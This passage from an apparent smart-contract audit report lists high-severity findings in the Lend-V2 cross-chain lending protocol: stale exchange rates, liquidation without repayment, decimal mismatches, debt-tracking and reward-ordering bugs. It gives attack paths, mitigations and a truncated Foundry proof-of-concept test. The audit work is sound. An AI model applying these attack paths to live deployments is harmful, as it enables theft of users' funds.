However, the condition `if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid)` can cause the function unable to find the correct cross chain borrow information to sum. This is because the [function `_handleBorrowCrossChainRequest()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L581C14-L581C44) adds cross chain collateral with `srcEid: srcEid, destEid: currentEid`, with `srcEid` is eid of source chain, and `currentEid` is eid of the dest chain. As a result, the function `borrowWithInterest()` will return `borrowedAmount = 0` and the max close is calculated to be `0` which is totally incorrect
```solidity
        ...
        if (found) {
            uint256 newPrincipleWithAmount = (userCrossChainCollaterals[index].principle * currentBorrowIndex)
                / userCrossChainCollaterals[index].borrowIndex;

            userCrossChainCollaterals[index].principle = newPrincipleWithAmount + payload.amount;
            userCrossChainCollaterals[index].borrowIndex = currentBorrowIndex;

            lendStorage.updateCrossChainCollateral(
                payload.sender, destUnderlying, index, userCrossChainCollaterals[index]
            );
        } else {
            lendStorage.addCrossChainCollateral(
                payload.sender,
                destUnderlying,
                LendStorage.Borrow({
@>                    srcEid: srcEid,
@>                    destEid: currentEid,
                    principle: payload.amount,
                    borrowIndex: currentBorrowIndex,
                    borrowedlToken: payload.destlToken,
                    srcToken: payload.srcToken
                })
            );
        }
        ...
```

### Internal Pre-conditions

NA

### External Pre-conditions

NA

### Attack Path

1. A cross chain borrow is executed
2. After some time, the debt position is under water
3. A cross chain liquidation is initiated but failed because repay amount must be > 0, but the max close is calculated to be 0

### Impact

- Unable to execute cross chain liquidation
- Core functionality is broken

### PoC

_No response_

### Mitigation

```diff
-    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
+    function borrowWithInterest(address borrower, address _lToken, uint32 remoteEid) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
-                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
+                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == remoteEid) {
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }
```

# Issue H-10: Outdated Exchange Rate Utilization 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/628 

## Found by 
0xiehnnkta, 0xlrivo, Audinarey, BimBamBuki, DharkArtz, Drynooo, ElmInNyc99, GypsyKing18, HeckerTrieuTien, Hueber, JeRRy0422, Light, Nomadic\_bear, TessKimy, Uddercover, Waydou, Ziusz, aman, chaos304, durov, eta, evmninja, francoHacker, future, ggg\_ttt\_hhh, h2134, harry, jo13, jokr, kelvinclassic11, lazyrams352, molaratai, momentum, newspacexyz, patitonar, rokinot, t.aksoy, udo, wickie, x0rc1ph3r, xiaoming90, yaioxy, ydlee, yoooo, zxriptor

### Summary
When users supply tokens, an outdated `exchangeRate` is utilized. Consequently, users obtain more lTokens than were actually minted, within the contract.

### Root Cause
The root cause is the use of an outdated exchange rate that does not account for the current pending interest in the lToken.

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L74
```solidity
    function supply(uint256 _amount, address _token) external {
        address _lToken = lendStorage.underlyingTolToken(_token);

        require(_lToken != address(0), "Unsupported Token");

        require(_amount > 0, "Zero supply amount");

        // Transfer tokens from the user to the contract
        IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);

        _approveToken(_token, _lToken, _amount);

        // Get exchange rate before mint
74:     uint256 exchangeRateBefore = LTokenInterface(_lToken).exchangeRateStored();

        // Mint lTokens
        require(LErc20Interface(_lToken).mint(_amount) == 0, "Mint failed");

        // Calculate actual minted tokens using exchangeRate from before mint
        uint256 mintTokens = (_amount * 1e18) / exchangeRateBefore;

        lendStorage.addUserSuppliedAsset(msg.sender, _lToken);

        lendStorage.distributeSupplierLend(_lToken, msg.sender);

        // Update total investment using calculated mintTokens
        lendStorage.updateTotalInvestment(
            msg.sender, _lToken, lendStorage.totalInvestment(msg.sender, _lToken) + mintTokens
        );

        emit SupplySuccess(msg.sender, _lToken, _amount, mintTokens);
    }
```
### Internal pre-conditions
In the lToken, there is pending interest.

### External pre-conditions
N/A

### Attack Path
1. Attacker supplies large amount of underlying.
2. Attacker withdraws small amount of lToken.
3. Attacker withdraws all remaining lToken.

### PoC
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LToken.sol#L271-L309
```solidity
    function exchangeRateCurrent() public override nonReentrant returns (uint256) {
        accrueInterest();
        return exchangeRateStored();
    }
    function exchangeRateStored() public view override returns (uint256) {
        return exchangeRateStoredInternal();
    }
    function exchangeRateStoredInternal() internal view virtual returns (uint256) {
        uint256 _totalSupply = totalSupply;
        if (_totalSupply == 0) {
            /*
             * If there are no tokens minted:
             *  exchangeRate = initialExchangeRate
             */
            return initialExchangeRateMantissa;
        } else {
            /*
             * Otherwise:
             *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply
             */
            uint256 totalCash = getCashPrior();
            uint256 cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;
            uint256 exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;

            return exchangeRate;
        }
    }
```
As can be seen, `exchangeRateStored` does not account for pending interest.
Consider the following scenario:
- Alice supplies 1010 underlying tokens.
- The exchangeRateStored is 1, with 1% of total assets as interest.
- At this time, exchangeRateCurrent is 1.01.
Alice should receive 1000 lTokens. However, due to the current implementation, she receives 1010 lTokens, even though the contract only receives 1000 lTokens. This leads to the lToken amount within the contract being less than the total of users' investments.

Additionally, when redeeming, the outdated exchangeRate is also utilized.

### Impact
Users can obtain more lTokens than intended when supplying tokens, leading to losses for other users.
Users may receive fewer underlying assets when redeeming.

### Mitigation
```diff
-74:     uint256 exchangeRateBefore = LTokenInterface(_lToken).exchangeRateStored();
+74:     uint256 exchangeRateBefore = LTokenInterface(_lToken).exchangeRateCurrent();
```

# Issue H-11: Malicious Liquidator Can Liquidate Without Providing Collateral 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/636 

## Found by 
0x23r0, Kvar, MRXSNOWDEN, Phaethon, SarveshLimaye, Tychai0s, alphacipher, anchabadze, dmdg321, dystopia, future, ggg\_ttt\_hhh, hgrano, jokr, oxelmiguel, rudhra1749, stonejiajia, t.aksoy

### Summary
In the current implementation of cross-chain liquidation, when a liquidation is requested on chainB (the destination chain), there is no transfer of the underlying token from the liquidator. If the seize operation succeeds on chainA (the source chain), the underlying tokens are transferred to the liquidator, and the repayment is executed on chainB. However, if the seize fails, the underlying tokens are transferred from the contract to the liquidator on chainB.

In this scenario, if the seize operation is successful but the liquidator has not approved the underlying token on chainB, the repayment may fail while the liquidator still successfully receives the underlying tokens from the liquidatee on chainA. This creates a potential exploit.

### Root Cause
The root cause of this issue is that, on chainB, there is no transfer of the underlying tokens from the liquidator at the start of the liquidation process.

### Internal pre-conditions
N/A

### External pre-conditions
N/A

### Attack Path
N/A

### PoC
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L172-L192
```solidity
    function liquidateCrossChain(
        ...
    ) external {
        LendStorage.LiquidationParams memory params = LendStorage.LiquidationParams({
            ...
        });

        _validateAndPrepareLiquidation(params);
        _executeLiquidation(params);
    }
```
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L197-L233
```solidity
    function _validateAndPrepareLiquidation(LendStorage.LiquidationParams memory params) private view {
        require(params.borrower != msg.sender, "Liquidator cannot be borrower");
        require(params.repayAmount > 0, "Repay amount cannot be zero");

        // Get the lToken for the borrowed asset on this chain
        params.borrowedlToken = lendStorage.underlyingTolToken(params.borrowedAsset);
        require(params.borrowedlToken != address(0), "Invalid borrowed asset");

        // Important: Use underlying token addresses consistently
        address borrowedUnderlying = lendStorage.lTokenToUnderlying(params.borrowedlToken);

        // Verify the borrow position exists and get details
        LendStorage.Borrow[] memory userCrossChainCollaterals =
            lendStorage.getCrossChainCollaterals(params.borrower, borrowedUnderlying);
        bool found = false;

        for (uint256 i = 0; i < userCrossChainCollaterals.length;) {
            if (userCrossChainCollaterals[i].srcEid == params.srcEid) {
                found = true;
                params.storedBorrowIndex = userCrossChainCollaterals[i].borrowIndex;
                params.borrowPrinciple = userCrossChainCollaterals[i].principle;
                break;
            }
            unchecked {
                ++i;
            }
        }
        require(found, "No matching borrow position");

        // Validate liquidation amount against close factor
        uint256 maxLiquidationAmount = lendStorage.getMaxLiquidationRepayAmount(
            params.borrower,
            params.borrowedlToken,
            false // cross-chain liquidation
        );
        require(params.repayAmount <= maxLiquidationAmount, "Exceeds max liquidation");
    }
```
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L235-L243
```solidity
    function _executeLiquidation(LendStorage.LiquidationParams memory params) private {
        // First part: Validate and prepare liquidation parameters
        uint256 maxLiquidation = _prepareLiquidationValues(params);

        require(params.repayAmount <= maxLiquidation, "Exceeds max liquidation");

        // Secon part: Validate collateral and execute liquidation
        _executeLiquidationCore(params);
    }
```
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L264-L285
```solidity
    function _executeLiquidationCore(LendStorage.LiquidationParams memory params) private {
        // Calculate seize tokens
        address borrowedlToken = lendStorage.underlyingTolToken(params.borrowedAsset);

        (uint256 amountSeizeError, uint256 seizeTokens) = LendtrollerInterfaceV2(lendtroller)
            .liquidateCalculateSeizeTokens(borrowedlToken, params.lTokenToSeize, params.repayAmount);

        require(amountSeizeError == 0, "Seize calculation failed");

        // Send message to Chain A to execute the seize
        _send(
            params.srcEid,
            seizeTokens,
            params.storedBorrowIndex,
            0,
            params.borrower,
            lendStorage.crossChainLTokenMap(params.lTokenToSeize, params.srcEid), // Convert to Chain A version before sending
            msg.sender,
            params.borrowedAsset,
            ContractType.CrossChainLiquidationExecute
        );
    }
```

### Impact
A malicious liquidator can liquidate without providing the necessary collateral resulting the liquidatee's debt is not deducted.

### Mitigation
Consider implementing an escrow mechanism for the collateral from the liquidator before initiating the liquidation process to ensure that the collateral is secured.

# Issue H-12: Users will lose funds due to token decimal mismatches across chains 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/665 

## Found by 
Kirkeelee, Sa1ntRobi, anchabadze, h2134, heavyw8t, yaioxy, zxriptor

### Summary

The lack of decimal normalization in cross-chain token transfers will cause users to lose significant funds, as borrowers will receive incorrect amounts when borrowing across chains with different token decimals.

### Root Cause

In [CrossChainRouter.sol:_handleBorrowCrossChainRequest()](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/713372a1ccd8090ead836ca6b1acf92e97de4679/Lend-V2/src/LayerZero/CrossChainRouter.sol#L581) and [CoreRouter.sol:borrowForCrossChain()](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/713372a1ccd8090ead836ca6b1acf92e97de4679/Lend-V2/src/LayerZero/CoreRouter.sol#L195C5-L205C6), the protocol assumes tokens have the same decimals across chains, but tokens like USDC have 6 decimals on Ethereum and 18 decimals on Base. The amount is passed directly through LayerZero without adjusting for these decimal differences, leading to incorrect borrow amounts.

### Internal Pre-conditions

1. User needs to call borrowCrossChain() with a token that has different decimals on source and destination chains
2. The token must be whitelisted and supported on both chains
3. User must have sufficient collateral on the source chain

### External Pre-conditions

Token decimals must differ between chains (e.g. USDC with 6 decimals on Ethereum and 18 decimals on Base)

### Attack Path

1. User calls borrowCrossChain() on Chain A to borrow 1000 USDC (6 decimals)
2. LayerZero delivers message to Chain B where USDC has 18 decimals
3. _handleBorrowCrossChainRequest() processes the amount directly
4. CoreRouter.borrowForCrossChain() transfers 1000 USDC (interpreted as 18 decimals)
5. User receives 1000e18 instead of 1000e6 USDC on Chain B

### Impact

The borrower receives 1000e18 instead of 1000e6 tokens, causing either:

- Massive overborrowing if decimals increase across chains
- Tiny underborrowing if decimals decrease across chains In both cases, users suffer significant financial losses.

### PoC

_No response_

### Mitigation

Add decimal normalization in `CrossChainRouter._handleBorrowCrossChainRequest()`

# Issue H-13: Incorrect Debt Tracking in `_updateRepaymentState` 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/672 

## Found by 
DharkArtz, PNS, Waydou, future, h2134, hgrano, mahdifa, rudhra1749, t.aksoy

## Summary
In `CrossChainRouter.sol`, the [_updateRepaymentState](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/713372a1ccd8090ead836ca6b1acf92e97de4679/Lend-V2/src/LayerZero/CrossChainRouter.sol#L505) function incorrectly checks `userCrossChainCollaterals.length == 1` after calling `removeCrossChainCollateral`. This leads to two issues: (1) if `crossChainCollaterals` has one element, the token is not removed from `userBorrowedAssets` despite no remaining debt, and (2) if it has two elements, the token is erroneously removed while a debt remains. This disrupts debt tracking, potentially enabling unauthorized collateral withdrawal or liquidation errors.

## Root Cause
In `_updateRepaymentState`:
```solidity
if (repayAmountFinal == borrowedAmount) {
    lendStorage.removeCrossChainCollateral(borrower, _token, index);
    if (userCrossChainCollaterals.length == 1) {
        lendStorage.removeUserBorrowedAsset(borrower, _lToken);
    }
}
```
The `userCrossChainCollaterals.length` is checked after `removeCrossChainCollateral`, which reduces the array length. If `length` was 1 before removal, it becomes 0, so `removeUserBorrowedAsset` is not called, leaving the token in `userBorrowedAssets`. If `length` was 2, it becomes 1, triggering `removeUserBorrowedAsset` incorrectly while a debt remains.

## Internal Pre-conditions
1. The protocol tracks cross-chain debts in `lendStorage.crossChainCollaterals`.
2. `_updateRepaymentState` manages debt updates during cross-chain repayments.
3. `userBorrowedAssets` tracks tokens with active debts.

## External Pre-conditions
1. A user has a cross-chain borrow (e.g., 100 USDC) on chain B with collateral in chain A.
2. The user or a liquidator calls `repayCrossChainBorrow` with `_amount = type(uint256).max` to fully repay the borrow.

## Attack Path
1. **Single Debt Case**:
   - User has one cross-chain borrow; repayment removes it but leaves `_lToken` in `userBorrowedAssets`.
   - User may withdraw collateral without proper debt validation.
2. **Multiple Debt Case**:
   - User has two cross-chain borrows; repaying one removes `_lToken` from `userBorrowedAssets` despite a remaining debt.
   - This may prevent liquidation or allow incorrect collateral calculations.

## Impact
- **Broken Functionality**: Incorrect debt tracking disrupts collateral and liquidation calculations, breaking core protocol functionality (Sherlock Section V).
- **Relevant Loss**: Potential unauthorized collateral withdrawal or liquidation failures could cause losses (>0.01% and >$10) under specific conditions (Section V).
- **Sherlock Criteria**: The issue requires specific debt scenarios (one or two cross-chain borrows), aligning with Medium severity.

## Mitigation
Check `userCrossChainCollaterals.length` before calling `removeCrossChainCollateral`. Update the code as follows:
```solidity
if (repayAmountFinal == borrowedAmount) {
    bool isLastCollateral = userCrossChainCollaterals.length == 1;
    lendStorage.removeCrossChainCollateral(borrower, _token, index);
    if (isLastCollateral) {
        lendStorage.removeUserBorrowedAsset(borrower, _lToken);
    }
}
```
This ensures `_lToken` is removed from `userBorrowedAssets` only when the last debt is repaid.

# Issue H-14: Cross-Chain Borrowing will not work as intended 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/711 

## Found by 
0xc0ffEE, xiaoming90

### Summary

-

### Root Cause

-

### Internal Pre-conditions

-

### External Pre-conditions

-

### Attack Path

The protocol's design or intention is to allow Bob to deposit collateral on Chain A, and then let him use that collateral in Chain A to borrow assets from Chain B.

Assume that Bob supplied 10000 USDC as collateral in Chain A. He calls `borrowCrossChain()` on Chain A to borrow from Chain B. When the LayerZero delivers the message to Chain B, Chain B's `CrossChainRouter._handleBorrowCrossChainRequest()` -> `CoreRouter.borrowForCrossChain()` -> `LErc20.borrow()` will be executed.

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L581

```solidity
File: CrossChainRouter.sol
581:     function _handleBorrowCrossChainRequest(LZPayload memory payload, uint32 srcEid) private {
..SNIP..
624:         // Execute the borrow on destination chain
625:         CoreRouter(coreRouter).borrowForCrossChain(payload.sender, payload.amount, payload.destlToken, destUnderlying);
626: 
```

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L195

```solidity
File: CoreRouter.sol
195:     function borrowForCrossChain(address _borrower, uint256 _amount, address _destlToken, address _destUnderlying)
196:         external
197:     {
198:         require(crossChainRouter != address(0), "CrossChainRouter not set");
199: 
200:         require(msg.sender == crossChainRouter, "Access Denied");
201: 
202:         require(LErc20Interface(_destlToken).borrow(_amount) == 0, "Borrow failed"); // <= Revert!
203: 
204:         IERC20(_destUnderlying).transfer(_borrower, _amount);
205:     }
```

Inside the internal code of `LErc20.borrow()`, it will call `borrowFresh()` -> `Lendtroller.getHypotheticalAccountLiquidityInternal()`

The problem or issue here is that Chain B's `Lendtroller.getHypotheticalAccountLiquidityInternal()` function only takes into account the collateral of Chain B. Also, note that `Lendtroller.getHypotheticalAccountLiquidityInternal()` is the original Compound V2 function. Thus, the borrowing will eventually revert due to insufficient collateral because it cannot see Bob's Chain A collateral.

### Impact

Core protocol functionality is broken

### PoC

_No response_

### Mitigation

_No response_

# Issue H-15: Incorrect Order of Operations in Reward Distribution Leads to Over/Under-Rewarding During Liquidations 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/726 

## Found by 
0xc0ffEE, Kirkeelee, Kvar, PNS, dystopia, future, ggg\_ttt\_hhh, hard1k, holtzzx, jokr, mussucal, patitonar, rudhra1749, t.aksoy, xiaoming90



## Description

The protocol has a critical issue in reward distribution during liquidations and repayments. Rewards are calculated and distributed based on **old balances** before the actual balance updates occur, leading to incorrect reward allocations.
**Root Cause:**
The issue stems from the order of operations in two key functions:

1. **`repayBorrowInternal()`**: Calls `distributeBorrowerLend()` before updating the borrower's debt balance
```solidity
// filepath: src/CoreRouter.sol
function repayBorrowInternal(
    uint256 repayAmount,
    address _lToken,
    address borrower
) internal {
    uint256 borrowedAmount = lendStorage.borrowWithInterestSame(borrower, _lToken);
    // ...

    // ❌ PROBLEM: Rewards distributed based on old (higher) debt amount
    lendStorage.distributeBorrowerLend(_lToken, borrower);

    // Actual debt reduction happens after rewards
    require(LErc20Interface(_lToken).repayBorrow(repayAmountFinal) == 0, "Repay failed");
    lendStorage.updateBorrowBalance(
        borrower,
        _lToken,
        borrowedAmount - repayAmountFinal,
        block.timestamp
    );
}
```
2. **`liquidateSeizeUpdate()`**: Calls `distributeSupplierLend()` before updating collateral balances (`totalInvestment`)
```solidity
// filepath: src/CoreRouter.sol
function liquidateSeizeUpdate(
    address lTokenCollateral,
    address borrower,
    address sender,
    uint256 seizeTokens
) internal {
    // ❌ PROBLEM: Rewards distributed based on old balances
    lendStorage.distributeSupplierLend(lTokenCollateral, sender);     // Liquidator gets 0 rewards
    lendStorage.distributeSupplierLend(lTokenCollateral, borrower);   // Borrower gets rewards on lost collateral

    // Balance updates happen after rewards
    lendStorage.updateTotalInvestment(borrower, lTokenCollateral, 
        lendStorage.totalInvestment(borrower, lTokenCollateral) - seizeTokens);
    lendStorage.updateTotalInvestment(sender, lTokenCollateral,
        lendStorage.totalInvestment(sender, lTokenCollateral) + seizeTokens);
}
```

Rewards are calculated as following

```solidity
// filepath: src/LayerZero/LendStorage.sol
function distributeBorrowerLend(address lToken, address borrower) external {
    uint256 borrowerIndex = lendBorrowerIndex[lToken][borrower];
    uint256 borrowBalance = borrowWithInterestSame(borrower, lToken);

    // ❌ PROBLEM: Uses old borrow balance before repayment/liquidation
    uint256 borrowerDelta = borrowBalance * (marketBorrowIndex[lToken] - borrowerIndex) / 1e36;
    lendAccrued[borrower] += borrowerDelta;
}

function distributeSupplierLend(address lToken, address supplier) external {
    uint256 supplyIndex = lendSupplierIndex[lToken][supplier];
    uint256 supplierTokens = totalInvestment[supplier][lToken];

    // ❌ PROBLEM: Uses old collateral balance before seizure
    uint256 supplierDelta = supplierTokens * (marketSupplyIndex[lToken] - supplyIndex) / 1e36;
    lendAccrued[supplier] += supplierDelta;
}
```

**Impact on Liquidations:**
During liquidation, the following problematic sequence occurs:
1. `liquidateBorrow()` calls `repayBorrowInternal()`
2. `repayBorrowInternal()` distributes borrower rewards based on **old (higher) debt amount**
3. Debt balance is updated (reduced)
4. `liquidateSeizeUpdate()` distributes supplier rewards based on **old collateral balances**
5. Collateral balances are finally updated (seizure occurs)

**Specific Problems:**
- **Borrowers are over-rewarded**: They receive LEND tokens calculated on debt they've already repaid
- **Borrowers receive double rewards**: They get supplier rewards on collateral they're about to lose
- **Liquidators are under-rewarded**: They receive no rewards on newly seized collateral since their balance is still zero during distribution



## Proof of Concept


```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Test, console2} from "forge-std/Test.sol";
import {Deploy} from "../script/Deploy.s.sol";
import {HelperConfig} from "../script/HelperConfig.s.sol";
import {CrossChainRouterMock} from "./mocks/CrossChainRouterMock.sol";
import {CoreRouter} from "../src/LayerZero/CoreRouter.sol";
import {LendStorage} from "../src/LayerZero/LendStorage.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {Lendtroller} from "../src/Lendtroller.sol";
import {InterestRateModel} from "../src/InterestRateModel.sol";
import {SimplePriceOracle} from "../src/SimplePriceOracle.sol";
import {LTokenInterface} from "../src/LTokenInterfaces.sol";
import {LToken} from "../src/LToken.sol";
import "@layerzerolabs/lz-evm-oapp-v2/test/TestHelper.sol";
import "@layerzerolabs/lz-evm-protocol-v2/test/utils/LayerZeroTest.sol";

/**
 * @title TestRewardTimingIssue
 * @notice Demonstrates the critical reward distribution timing issue in liquidations
 * 
 * ISSUE: Rewards are distributed BEFORE balance updates, causing:
 * 1. Borrowers get LEND rewards on debt they've already repaid
 * 2. Liquidators don't get rewards on newly seized collateral
 * 3. Suppliers get rewards on tokens they no longer own
 */
contract TestRewardTimingIssue is LayerZeroTest {
    // State variables
    address public deployer;
    address public liquidator;

    // Chain A (Source)
    CrossChainRouterMock public routerA;
    LendStorage public lendStorageA;
    CoreRouter public coreRouterA;
    Lendtroller public lendtrollerA;
    SimplePriceOracle public priceOracleA;
    address[] public lTokensA;
    address[] public supportedTokensA;

    EndpointV2 public endpointA;

    function setUp() public override(LayerZeroTest) {
        super.setUp();

        deployer = makeAddr("deployer");
        liquidator = makeAddr("liquidator");
        vm.deal(deployer, 1000 ether);
        vm.deal(liquidator, 1000 ether);

        // Deploy protocol on Chain A
        Deploy deployA = new Deploy();
        (
            address priceOracleAddressA,
            address lendtrollerAddressA,
            address interestRateModelAddressA,
            address[] memory lTokenAddressesA,
            address payable routerAddressA,
            address payable coreRouterAddressA,
            address lendStorageAddressA,
            ,
            address[] memory _supportedTokensA
        ) = deployA.run(address(endpointA));

        // Store Chain A values
        routerA = CrossChainRouterMock(payable(routerAddressA));
        lendStorageA = LendStorage(lendStorageAddressA);
        coreRouterA = CoreRouter(coreRouterAddressA);
        lendtrollerA = Lendtroller(lendtrollerAddressA);
        priceOracleA = SimplePriceOracle(priceOracleAddressA);
        lTokensA = lTokenAddressesA;
        supportedTokensA = _supportedTokensA;

        // Set up initial token prices
        for (uint256 i = 0; i < supportedTokensA.length; i++) {
            priceOracleA.setDirectPrice(supportedTokensA[i], 1e18);
        }
    }

    function _supplyA(address user, uint256 amount, uint256 tokenIndex)
        internal
        returns (address token, address lToken)
    {
        token = supportedTokensA[tokenIndex];
        lToken = lendStorageA.underlyingTolToken(token);

        vm.startPrank(user);
        ERC20Mock(token).mint(user, amount);
        IERC20(token).approve(address(coreRouterA), amount);
        coreRouterA.supply(amount, token);
        vm.stopPrank();
    }

    /**
     * @notice Test demonstrating the reward distribution timing issue in liquidations
     * 
     * This test shows the problematic order of operations in the liquidation process:
     * 
     * CURRENT (PROBLEMATIC) ORDER:
     * 1. liquidateBorrow() calls repayBorrowInternal()
     * 2. repayBorrowInternal() calls distributeBorrowerLend() BEFORE updating borrow balance
     * 3. liquidateBorrow() calls liquidateSeizeUpdate()
     * 4. liquidateSeizeUpdate() calls distributeSupplierLend() BEFORE updating totalInvestment
     * 5. Finally, balance updates happen
     * 
     * RESULT: Rewards calculated on OLD balances, not NEW balances
     */
    function test_liquidation_reward_timing_demonstrates_issue() public {
     //   uint256 supplyAmount = 1000e18;
        uint256 borrowAmount = 600e18; // 60% LTV
        uint256 repayAmount = 300e18; // 50% of borrow

        console2.log("=== DEMONSTRATING REWARD DISTRIBUTION TIMING ISSUE ===");
        console2.log("");

        // Setup: deployer supplies collateral, borrows, then price drops
        (address tokenA, address lTokenA) = _supplyA(deployer, 1000e18, 0);
        (address tokenB, address lTokenB) = _supplyA(address(1), 1000e18, 1);

        vm.prank(deployer);
        coreRouterA.borrow(borrowAmount, tokenB);

        // Simulate 50% price drop to make position liquidatable
        priceOracleA.setDirectPrice(tokenA, 5e17);

        // Record pre-liquidation state

        uint256 deployerCollateralBefore = lendStorageA.totalInvestment(deployer, lTokenA);
        uint256 liquidatorCollateralBefore = lendStorageA.totalInvestment(liquidator, lTokenA);
        uint256 deployerBorrowBefore = lendStorageA.borrowWithInterestSame(deployer, lTokenB);

        console2.log("PRE-LIQUIDATION STATE:");
        console2.log("  Deployer collateral balance:", deployerCollateralBefore);
        console2.log("  Liquidator collateral balance:", liquidatorCollateralBefore);
        console2.log("  Deployer borrow balance:", deployerBorrowBefore);
        console2.log(" Deployer INDEX BEFORE", lendStorageA.lendSupplierIndex(lTokenB, deployer));
        console2.log(" Deployer INDEX BEFORE ", lendStorageA.lendSupplierIndex(lTokenA, deployer));
        console2.log(" DEPLOYER BORROW INDEX BEFORE ", lendStorageA.lendBorrowerIndex(lTokenB, deployer));
        // Verify we have a valid liquidation scenario
        require(deployerBorrowBefore > 0, "Deployer should have borrowed tokens");
        require(deployerCollateralBefore > 0, "Deployer should have collateral");
        
        console2.log("");

        console2.log("LIQUIDATION PROCESS (showing problematic order):");
        console2.log("1. liquidateBorrow() is called");
        console2.log("2. repayBorrowInternal() is called");
        console2.log("3. distributeBorrowerLend() is called BEFORE borrow balance update");
        console2.log("   -> Borrower gets rewards on debt they're about to repay");
        console2.log("4. Borrow balance is updated (debt reduced)");
        console2.log("5. liquidateSeizeUpdate() is called");
        console2.log("6. distributeSupplierLend() is called BEFORE collateral balance update");
        console2.log("   -> Borrower gets rewards on collateral they're about to lose");
        console2.log("   -> Liquidator gets NO rewards on collateral they're about to gain");
        console2.log("7. Collateral balances are updated (seizure happens)");
        console2.log("");

        // Execute liquidation
        vm.startPrank(liquidator);
        ERC20Mock(tokenB).mint(liquidator, repayAmount);
        IERC20(tokenB).approve(address(coreRouterA), repayAmount);
        coreRouterA.liquidateBorrow(deployer, repayAmount, lTokenA, tokenB);
        vm.stopPrank();

        // Record post-liquidation state
        uint256 deployerCollateralAfter = lendStorageA.totalInvestment(deployer, lTokenA);
        uint256 liquidatorCollateralAfter = lendStorageA.totalInvestment(liquidator, lTokenA);
        uint256 deployerBorrowAfter = lendStorageA.borrowWithInterestSame(deployer, lTokenB);

        console2.log("POST-LIQUIDATION STATE:");
        console2.log("  Deployer collateral balance:", deployerCollateralAfter);
        console2.log("  Liquidator collateral balance:", liquidatorCollateralAfter);
        console2.log("  Deployer borrow balance:", deployerBorrowAfter);
        console2.log(" Deployer SUPPLIER INDEX AFTER ", lendStorageA.lendSupplierIndex(lTokenB, deployer));
        console2.log(" Deployer SUPPLIER INDEX AFTER ", lendStorageA.lendSupplierIndex(lTokenA, deployer));
        console2.log(" DEPLOYER BORROW INDEX AFTER ", lendStorageA.lendBorrowerIndex(lTokenB, deployer));
        console2.log(" DEPLOYER BORROW INDEX AFTER ", lendStorageA.lendBorrowerIndex(lTokenA, deployer));
        console2.log(" Liquidator SUPPLIER INDEX AFTER ", lendStorageA.lendSupplierIndex(lTokenA, liquidator));

        console2.log("");

        // Calculate changes
        uint256 collateralSeized = deployerCollateralBefore - deployerCollateralAfter;
        uint256 collateralGained = liquidatorCollateralAfter - liquidatorCollateralBefore;
        uint256 debtRepaid = deployerBorrowBefore - deployerBorrowAfter;

        console2.log("CHANGES:");
        console2.log("  Collateral seized from deployer:", collateralSeized);
        console2.log("  Collateral gained by liquidator:", collateralGained);
        console2.log("  Debt repaid:", debtRepaid);
        console2.log("");

        console2.log("THE PROBLEM:");
        console2.log("Because reward distribution happens BEFORE balance updates:");
        console2.log("1. Borrower got rewards based on their OLD (higher) debt amount");
        console2.log("2. Borrower got rewards based on their OLD (higher) collateral amount");
        console2.log("3. Liquidator got rewards based on their OLD (zero) collateral amount");
        console2.log("");
        console2.log("This means:");
        console2.log("- Borrowers are over-rewarded for debt they no longer have");
        console2.log("- Borrowers are over-rewarded for collateral they no longer have");
        console2.log("- Liquidators are under-rewarded for collateral they now have");
        console2.log("");

        console2.log("CORRECT ORDER SHOULD BE:");
        console2.log("1. Update borrow balance FIRST");
        console2.log("2. THEN distribute borrower rewards based on NEW balance");
        console2.log("3. Update collateral balances FIRST");
